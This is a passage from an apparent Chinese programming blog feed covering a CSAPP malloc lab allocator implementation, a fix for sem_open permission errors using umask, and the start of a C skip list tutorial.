&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5><span id="coalesace">coalesace</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">int</span> prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(p)));</span><br><span class="line">    <span class="type">int</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(p)));</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(p));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;             <span class="comment">// 前后块均已分配，不可合并</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;			<span class="comment">// 前面的块已分配，后面的块未分配</span></span><br><span class="line">        delete_node(p);</span><br><span class="line">        delete_node(NEXT_BLKP(p));</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(p)));</span><br><span class="line">        PUT(HDRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;		<span class="comment">// 前面的块未分配，后面的块已分配</span></span><br><span class="line">        delete_node(PREV_BLKP(p));</span><br><span class="line">        delete_node(p);</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(p)));</span><br><span class="line">        PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        p = PREV_BLKP(p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                     <span class="comment">// 前后两个块都空闲，一次性合并三个块</span></span><br><span class="line">        delete_node(PREV_BLKP(p));</span><br><span class="line">        delete_node(p);</span><br><span class="line">        delete_node(NEXT_BLKP(p));</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(p))) + GET_SIZE(HDRP(NEXT_BLKP(p)));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        p = PREV_BLKP(p);</span><br><span class="line">    &#125;</span><br><span class="line">    insert_node(p, size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5><span id="place">place</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 32位系统，块最小为 4 + 2 * 4 + 4 = 16字节</span></span><br><span class="line"><span class="comment">// 64位系统, 块最小为 4 + 2 * 8 + 4 = 24字节</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> max_size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="type">int</span> delta_size = max_size - size;</span><br><span class="line">    delete_node(p);</span><br><span class="line">    <span class="comment">// 如剩余大小少于最小块大小, 不做分割</span></span><br><span class="line">    <span class="keyword">if</span> (delta_size &lt; MIN_BLOCK_SIZE) &#123;</span><br><span class="line">        PUT(HDRP(p), PACK(max_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(p), PACK(max_size, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 否则需要分割，并将分割后的空闲块加到空闲链表</span></span><br><span class="line">    PUT(HDRP(p), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(p), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(p)), PACK(delta_size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(NEXT_BLKP(p)), PACK(delta_size, <span class="number">0</span>));</span><br><span class="line">    insert_node(NEXT_BLKP(p), delta_size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5><span id="extend_heap">extend_heap</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    size = ALIGN(size);</span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    <span class="keyword">if</span> ((p = mem_sbrk(size)) == (<span class="type">void</span> *)<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;extend_heap failed! mem_sbrk return -1!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(p)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    insert_node(p, size);</span><br><span class="line">    <span class="keyword">return</span> coalesce(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="初始化堆-mm_init">初始化堆 —— mm_init</span></h4><p>调用mm_init后，堆数组结构如下图所示：<br><img data-src="/2020/0926191511/image8.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 4字节对齐块 + MAX_LIST_NUM * DSIZE字节的空闲链表头指针 + 2个4字节序言块 + 4字节结尾块</span></span><br><span class="line">    <span class="type">char</span> *p = mem_sbrk(MAX_LIST_NUM * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>) + <span class="number">4</span> * WSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)p == (<span class="type">void</span> *)(<span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将所有空闲链表的头指针初始为NULL</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        PUT_P(p + i * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p += MAX_LIST_NUM * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>);</span><br><span class="line"></span><br><span class="line">    PUT(p, <span class="number">0</span>);								<span class="comment">// 4字节对齐块，填0;</span></span><br><span class="line">    PUT(p + WSIZE, PACK(DSIZE, <span class="number">1</span>));			<span class="comment">// 序言块头部，4字节</span></span><br><span class="line">    PUT(p + <span class="number">2</span> * WSIZE, PACK(DSIZE, <span class="number">1</span>));		<span class="comment">// 序言块脚部，4字节</span></span><br><span class="line">    PUT(p + <span class="number">3</span> * WSIZE, PACK(<span class="number">0</span>, <span class="number">1</span>));			<span class="comment">// 结尾快，4字节</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((p = extend_heap(CHUNKSIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="分配块-mm_malloc">分配块 —— mm_malloc</span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    size = get_malloc_size(size);	<span class="comment">// 得到调整后的malloc请求大小</span></span><br><span class="line">    <span class="comment">// 寻找空闲链表是否有合适的空闲块。如果没找到合适的空闲块, 需要扩展堆</span></span><br><span class="line">    <span class="type">void</span> *p = find_free_block(size);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((p = extend_heap(MAX(size, CHUNKSIZE))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mm_malloc, extend_heap failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    p = place(p, size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="释放块-mm_free">释放块 —— mm_free</span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// 将释放后的空闲块重新插入到分离链表中</span></span><br><span class="line">    insert_node(ptr, size);</span><br><span class="line">    coalesce(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="重分配块-mm_realloc">重分配块 —— mm_realloc</span></h4><p>函数原型：<code>void *mm_realloc(void *p, size_t size)</code>， 优化点如下：</p>
<ul>
<li><p>如<code>size</code>小于原来的块大小，简单返回原块即可。</p>
</li>
<li><p>如下一块为空闲块，且<code>空闲块大小 + 原块大小 &gt;= size</code>, 直接合并这两个块。</p>
</li>
<li><p>否则，只能用<code>malloc</code>申请新的空闲块，复制原块，再调用<code>free</code>释放原块</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span> || size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果realloc请求的size小于原来的大小，简单返回原块</span></span><br><span class="line">    size = get_malloc_size(size);</span><br><span class="line">    <span class="type">int</span> old_size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span> (old_size &gt;= size) &#123;</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 考虑下一个块是否空闲块，能否直接合并</span></span><br><span class="line">    <span class="type">int</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">    <span class="type">int</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">    <span class="keyword">if</span> (!next_alloc &amp;&amp; (next_size &gt;= size - old_size)) &#123;</span><br><span class="line">        delete_node(NEXT_BLKP(ptr));</span><br><span class="line">        PUT(HDRP(ptr), PACK(next_size + old_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(next_size + old_size, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只能使用malloc申请新的空闲块，复制原块内容，并调用free释放原块</span></span><br><span class="line">    <span class="type">void</span> *oldptr = ptr;</span><br><span class="line">    ptr = mm_malloc(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, oldptr, old_size);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="实验结果">实验结果</span></h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./mdriver -t traces/ -V</span><br><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.000886  6430</span><br><span class="line"> 1       yes   99%    5848  0.000793  7379</span><br><span class="line"> 2       yes   99%    6648  0.000903  7359</span><br><span class="line"> 3       yes   99%    5380  0.000749  7182</span><br><span class="line"> 4       yes   66%   14400  0.001754  8212</span><br><span class="line"> 5       yes   96%    4800  0.001114  4308</span><br><span class="line"> 6       yes   95%    4800  0.001112  4317</span><br><span class="line"> 7       yes   55%   12000  0.004104  2924</span><br><span class="line"> 8       yes   51%   24000  0.014884  1612</span><br><span class="line"> 9       yes   87%   14401  0.001490  9667</span><br><span class="line">10       yes   67%   14401  0.001074 13405</span><br><span class="line">Total          83%  112372  0.028862  3893</span><br><span class="line"></span><br><span class="line">Perf index = 50 (util) + 40 (thru) = 90/100</span><br></pre></td></tr></table></figure>

<h3><span id="参考资料">参考资料</span></h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://littlecsd.net/2019/02/14/csapp-Malloclab/">https://littlecsd.net/2019/02/14/csapp-Malloclab/</a></p>
<p><a href="https://www.cnblogs.com/liqiuhao/p/8252373.html">https://www.cnblogs.com/liqiuhao/p/8252373.html</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>sem_open打开信号量失败案例分析</title>
    <url>/2020/1114192034.html</url>
    <content><![CDATA[<h3><span id="问题描述">问题描述</span></h3><p>root进程调<code>sem_open(XXX, O_CREAT, 0666, 1)</code>创建信号量后，非root进程使用<code>sem_open</code>打开同一个信号量失败，报<code>Permission Denied</code>错</p>
<h3><span id="原因分析">原因分析</span></h3><p>非root进程调用<code>sem_open</code>， 以<code>O_CREAT</code>方式打开信号量，需要同时有对该信号量文件的读权限 + 写权限。</p>
<p><code>ll /dev/shm/sem.semname</code> 查看信号量文件权限，发现权限为0644，缺少其他用户写权限。这个权限与sem_open中指定的权限值0666不一致。</p>
<span id="more"></span>

<h4><span id="为什么sem_open中mode参数指定的权限0666和创建文件的实际权限0644不一致">为什么sem_open中mode参数指定的权限(0666)和创建文件的实际权限(0644)不一致？</span></h4><p>首先了解Linux中umask的概念。umask为用户文件创建掩码，是一种进程属性。当进程创建文件或目录时，该属性用于指明应屏蔽的权限位。大多数Linux系统的默认掩码为022，可在shell中通过umask命令查看。umask作用如下：</p>
<ul>
<li>若没有文件掩码，则创建文件的默认权限为0666, 创建目录的默认权限为0777</li>
<li>若使用默认掩码022, 则创建文件的权限为0666 - 0022 &#x3D; 0644, 创建目录的权限为 0777 - 0022 &#x3D; 0755</li>
</ul>
<h3><span id="解决方法">解决方法</span></h3><p>可以在进程调用<code>sem_open</code>之前，修改umask值为0，再创建有其他用户写权限的信号量即可。</p>
<p>系统调用umask()可以将进程的umask值改为mask参数所指定的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">mode_t</span> <span class="title function_">umask</span><span class="params">(<span class="type">mode_t</span> mask)</span>; <span class="comment">//调用总是成功，返回值为进程的前一个umask的值</span></span><br></pre></td></tr></table></figure>

<p>写法参考如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> *<span class="title function_">SemOpen</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">mode_t</span> mask = umask(<span class="number">0</span>);							<span class="comment">// 取消屏蔽的权限位</span></span><br><span class="line">	<span class="type">sem_t</span> *sem = sem_open(XXX, O_CREAT, <span class="number">0666</span>, <span class="number">1</span>);	<span class="comment">// 创建权限0666的二值有名信号量</span></span><br><span class="line">	umask(mask);									<span class="comment">// 恢复umask的值</span></span><br><span class="line">	<span class="keyword">return</span> sem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="参考资料">参考资料</span></h3><p>《Linux&#x2F;UNIX系统编程手册(上)》 —— 15.4.6 进程的文件模式创建掩码</p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>设计跳表, C语言实现</title>
    <url>/2020/1205192333.html</url>
    <content><![CDATA[<h3><span id="跳跃表简介">跳跃表简介</span></h3><p>跳跃表是<strong>一种以O(log N)期望时间支持查找、插入、删除操作的、有序的</strong>数据结构。其性能和红黑树相当，且跳跃表实现更为简单。</p>
<h3><span id="如何理解跳跃二字">如何理解”跳跃“二字</span></h3><span id="more"></span>

<ol>
<li>首先，考察一个有序的单链表。如下图所示，该链表由8个元素组成，为了查找元素14，需要依次遍历 2 -&gt; 4 -&gt; 6 -&gt; 8 -&gt; 10 -&gt; 12 -&gt; 14, 共考察7个节点。考察的节点数正比于链表长度，查找的时间复杂度为O(n)，效率很低。</li>
</ol>
<p><img data-src="/2020/1205192333/image1.png"></p>
<ol start="2">
<li><p>为了加快查找速度，可以对单链表进行改造，每隔一个节点新增一个指针，指向它前面两个位置上的节点。所有新增的节点组成一条新的单链表(下图中的链表1)。同样查找元素14，现在只需考察4, 8, 12, 14，共4个节点。<br><img data-src="/2020/1205192333/image2.png"></p>
</li>
<li><p>对链表1做类似的操作，又得到一条新的单链表(下图中的链表2)。此时查找元素14，只需考察8, 12, 14，共3个节点。</p>
</li>
</ol>
<p><img data-src="/2020/1205192333/image3.png"></p>
<p>可以看出，跳跃表是<strong>由多条有序链表组成，支持折半查找</strong>的数据结构。</p>
<h3><span id="实现跳跃表">实现跳跃表</span></h3><p>以下用C语言实现一个简单的跳表。跳表实现要求如下，详细参考：<a href="https://leetcode-cn.com/problems/design-skiplist/">LeetCode 1206 设计跳表</a></p>
<ul>
<li>需实现跳表<strong>创建、查找、插入、删除、释放</strong>等操作，不需实现区间查找。</li>
<li>跳表中的元素类型均为<code>int</code>。</li>
<li>跳表中可以存在多个相同的值。</li>
</ul>
<h4><span id="0-数据结构设计">0. 数据结构设计</span></h4><p>设计<code>SkiplistNode</code>结构表示跳跃表节点，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> value;							<span class="comment">// 存储值</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistLevel</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">next</span>;</span></span><br><span class="line">	&#125; level[];							<span class="comment">// 层，这里设计成柔性数组，简化malloc和free操作</span></span><br><span class="line">&#125; SkiplistNode;</span><br></pre></td></tr></table></figure>

<p>设计<code>Skiplist</code>结构持有这些跳跃表节点，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">head</span>;</span>			<span class="comment">// 跳跃表表头节点</span></span><br><span class="line">    <span class="type">int</span> length;							<span class="comment">// 跳跃表节点数，获取跳跃表长度的时间复杂度O(1)</span></span><br><span class="line">    <span class="type">int</span> level;							<span class="comment">// 记录跳跃表内，层数最大的那个节点的层数。</span></span><br><span class="line">&#125; Skiplist;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>length</code>表示跳跃表节点数，使得获取跳表长度的时间复杂度降为O(1)。</li>
<li><code>level</code>表示跳表层数，跳表的插入、删除操作需要读取和更新<code>level</code>的值。</li>
</ul>
<p>下图表示一个层数为3的节点：</p>
<p><img data-src="/2020/1205192333/image4.png"></p>
<p>下图表示一个长度为6，层数为4的跳表：</p>
<p><img data-src="/2020/1205192333/image5.png"></p>
<h4><span id="1-创建跳跃表">1. 创建跳跃表</span></h4><p>设计<code>Skiplist* skiplistCreate()</code>方法创建跳跃表，要点如下：</p>
<ul>
<li>给Skiplist分配空间，长度初始为0，层高初始为1</li>
<li>创建并初始化跳表的附加头节点，并设置层高为<code>SKIPLIST_MAXLEVEL</code>(32)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SKIPLIST_MAXLEVEL 32</span></span><br><span class="line"><span class="comment">// 跳表的创建</span></span><br><span class="line">Skiplist* <span class="title function_">skiplistCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    Skiplist *sl = (Skiplist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*sl));</span><br><span class="line">    sl-&gt;length = <span class="number">0</span>;</span><br><span class="line">    sl-&gt;level = <span class="number">1</span>;</span><br><span class="line">    sl-&gt;head = skiplistNodeCreate(SKIPLIST_MAXLEVEL, INT_MIN); <span class="comment">// 初始化表头节点的层高为32</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SKIPLIST_MAXLEVEL; ++i) &#123;</span><br><span class="line">        sl-&gt;head-&gt;level[i].next = <span class="literal">NULL</span>;		<span class="comment">// 初始化表头节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// helper func</span></span><br><span class="line">SkiplistNode* <span class="title function_">skiplistNodeCreate</span><span class="params">(<span class="type">int</span> level, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">    SkiplistNode *p = (SkiplistNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*p) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> SkiplistLevel) * level);</span><br><span class="line">    p-&gt;value = value;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="2-查找">2. 查找</span></h4><p>设计<code>bool skiplistSearch(Skiplist* obj, int target)</code>实现跳表的查找。</p>
<p>上面分析过，跳表就是由N条有序链表组成的，所以对跳表的查找相当于<strong>从高到低，依次在N条有序链表中</strong>查找。</p>
<p>举例说明，在下图给出的跳表中，查找元素60，红色箭头表示遍历过程。</p>
<p><img data-src="/2020/1205192333/image6.png"></p>
<p>代码实现如下：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳表的查找, 时间复杂度O(logN)</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">skiplistSearch</span><span class="params">(Skiplist* obj, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于target, 就沿着当前层继续查找</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; target) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第i层未找到该节点, 或者节点值已大于target, 沿着下一层继续查找</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;level[i].next == <span class="literal">NULL</span> || p-&gt;level[i].next-&gt;value &gt; target) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="3-插入">3. 插入</span></h4><p>设计<code>void skiplistAdd(Skiplist* obj, int num)</code>实现跳表的查找，要点如下：</p>
<ul>
<li>新增节点时，确定这个新增节点的层高。</li>
<li>如果新增节点的层数为N，需对这N条单链表分别执行插入操作。</li>
<li>成功插入节点后，注意更新跳表的长度和层高。</li>
</ul>
<h5><span id="31-如何确定新增节点的层高">3.1 如何确定新增节点的层高？</span></h5><p>跳表使用<strong>抛硬币</strong>的思想决定一个新增节点的层高，即有1&#x2F;2的概率层数为1，1&#x2F;4的概率层数为2，1&#x2F;8的概率层数为3，以此类推。 这里实现<code>GetSkipNodeRandomLevel</code>方法，确定新增节点层高，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetSkipNodeRandomLevel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> level = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (rand() &amp; <span class="number">0x1</span>) &#123;					<span class="comment">// 抛硬币思想，随机数为奇数的概率可认为是1/2</span></span><br><span class="line">        ++level;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min(level,SKIPLIST_MAXLEVEL); 	<span class="comment">// 返回的最大层数不超过32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5><span id="32-新增节点后如何更新跳表中对应的n条单链表">3.2 新增节点后，如何更新跳表中对应的N条单链表？</span></h5><p>举例说明，给定一个包含6个元素，层数为4的跳表，现在新增一个节点值为80，层数为5，插入前后的变化如下：</p>
<p><img data-src="/2020/1205192333/image7.png"></p>
<p>可以看出，往跳表中插入元素，<strong>只需在遍历跳表的过程中，保存这5条链表待插入位置的前驱节点(红圈表示)，再分别对每条单链表执行插入操作即可，最后更新跳表的长度和层高</strong>。代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳表的插入 O(logN)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">skiplistAdd</span><span class="params">(Skiplist* obj, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">preNodes</span>[<span class="title">SKIPLIST_MAXLEVEL</span>];</span> <span class="comment">// 保存待插入节点的所有前驱节点的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = obj-&gt;level; i &lt; SKIPLIST_MAXLEVEL; ++i) &#123;</span><br><span class="line">        preNodes[i] = obj-&gt;head;					  <span class="comment">// 初始化值为附加头结点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于target, 沿当前层继续查找插入的位置</span></span><br><span class="line">        <span class="keyword">while</span>( p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; num) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        preNodes[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> newLevel = GetSkipNodeRandomLevel();		<span class="comment">// 计算新插入节点的层数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">newNode</span> =</span> skiplistNodeCreate(newLevel, num);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; newLevel; ++i) &#123;</span><br><span class="line">        newNode-&gt;level[i].next = preNodes[i]-&gt;level[i].next;</span><br><span class="line">        preNodes[i]-&gt;level[i].next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;level = max(obj-&gt;level, newLevel);         <span class="comment">// 完成插入动作后，更新跳跃表当前层数</span></span><br><span class="line">    ++obj-&gt;length;									<span class="comment">// 完成插入动作后，更新跳跃表长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="4-删除">4. 删除</span></h4><p>设计<code>bool skiplistErase(Skiplist* obj, int num)</code>方法实现跳表的删除，要点如下：</p>
<ul>
<li>遍历跳表，确认待删除的值是否存在，这步和跳表的查找操作类似。</li>
<li>设待删除节点的层数为N，需对N条单链表分别执行删除操作。</li>
<li>成功删除节点后，注意更新跳表的长度和层高。</li>
</ul>
<p>代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳跃表删除操作 O(logN)</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">skiplistErase</span><span class="params">(Skiplist* obj, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">preNodes</span>[<span class="title">SKIPLIST_MAXLEVEL</span>];</span> <span class="comment">// 存储所有待删除节点的前驱节点的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于num, 沿当前层继续查找</span></span><br><span class="line">        <span 